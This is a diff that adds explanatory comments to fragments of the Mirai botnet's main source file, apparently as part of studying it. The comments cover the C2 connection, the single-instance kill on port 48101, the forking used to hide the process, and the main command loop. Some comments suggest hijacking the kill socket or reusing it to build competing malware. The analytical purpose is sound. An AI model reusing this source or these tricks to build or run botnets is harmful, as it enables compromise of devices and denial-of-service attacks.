@@ -32,7 +32,7 @@ static void ensure_single_instance(void);
 static BOOL unlock_tbl_if_nodebug(char *);
 
 struct sockaddr_in srv_addr;
-int fd_ctrl = -1, fd_serv = -1;
+int fd_ctrl = -1, fd_serv = -1;			//FD is File Descriptor used in socket programming, fd_ctrl is a socket used primeraly for killing/being killed by other instances of Mirai. fd_serv is a socket used for connecting to the C2 server
 BOOL pending_connection = FALSE;
 void(*resolve_func)(void) = (void(*)(void))util_local_addr; // Overridden in anti_gdb_entry
 
@@ -99,7 +99,6 @@ int main(int argc, char **args)
 	if (sigaction(SIGBUS, &sa, NULL) == -1)
 		perror("sigaction");
 #endif
-
 	LOCAL_ADDR = util_local_addr();
 
 	srv_addr.sin_family = AF_INET;
@@ -114,7 +113,7 @@ int main(int argc, char **args)
 		raise(SIGTRAP);
 #endif
 
-	ensure_single_instance();		//runs a function that checks for other processes running on port 48101 and kills it, then binds itseslf to port 48101
+	ensure_single_instance();		//runs a function that checks for other processes running on port 48101 and kills it, then binds itseslf to port 48101, this is mainly to ensure that there is only one/the most recent instance of the bot running on a single host
 
 	rand_init();
 
@@ -145,7 +144,7 @@ int main(int argc, char **args)
 	table_lock_val(TABLE_EXEC_SUCCESS);
 
 #ifndef DEBUG
-	if (fork() > 0)		//fork() creates a child (clone) of the process, the child is sent 0 and the parent is send the process id of the child. This then stops the parent process (presumably this is to fiurther hide the process)
+	if (fork() > 0)		//fork() creates a child (clone) of the process at this location, the child is sent 0 and the parent is send the process id of the child. This then stops the parent process (presumably this is to fiurther hide the process)
 		return 0;
 	pgid = setsid();	//setsid() creates a session (terminal) and sets pgid to the id of the session
 	close(STDIN);		//dissables the standard in, standard out and standard error reporting for the session 
@@ -161,7 +160,7 @@ int main(int argc, char **args)
 #endif
 #endif
 
-	while (TRUE)
+	while (TRUE)		//Main loop checks if bot should killitself, checks for connection to the C2 server and listens for attack instructions from C2
 	{
 		fd_set fdsetrd, fdsetwr, fdsetex;
 		struct timeval timeo;
@@ -208,8 +207,8 @@ int main(int argc, char **args)
 				send(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
 		}
 
-		// Check if we need to kill ourselves
-		if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
+		// Check if we need to kill ourselves				//Doesnt seem to have functionallity to be killed by the C2, only kills itself if new instance is detected
+		if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))		//Could hijack this condition by having another program try to connect to the socket and pose as a newer instance, this will cause the bot to kill itself and all child processes 
 		{
 			struct sockaddr_in cli_addr;
 			socklen_t cli_addr_len = sizeof(cli_addr);
@@ -238,7 +237,7 @@ int main(int argc, char **args)
 #ifdef DEBUG
 				printf("[main] Timed out while connecting to CNC\n");
 #endif
-				teardown_connection();
+				teardown_connection();		//calls teardown_connection() whenever fails to connect to C2, when it fails it simply re-loops and attempts to reconnect 
 			}
 			else
 			{
@@ -417,7 +416,7 @@ static void teardown_connection(void)
 	sleep(1);
 }
 
-static void ensure_single_instance(void)
+static void ensure_single_instance(void)		//Function responsable for detecting and killing other instances of the botnet, could be hijacked to be used to make a competitive malware that kills Mirai bots
 {
 	static BOOL local_bind = TRUE;
 	struct sockaddr_in addr;
@@ -447,7 +446,7 @@ static void ensure_single_instance(void)
 		addr.sin_addr.s_addr = INADDR_ANY;
 		addr.sin_port = htons(SINGLE_INSTANCE_PORT);
 
-		if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)
+		if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)		//Kills other instance by connecting to the fd_ctrl socket, this socket is queried on line 212 and if a connection is made the other instance kills itself
 		{
 #ifdef DEBUG
 			printf("[main] Failed to connect to fd_ctrl to request process termination\n");
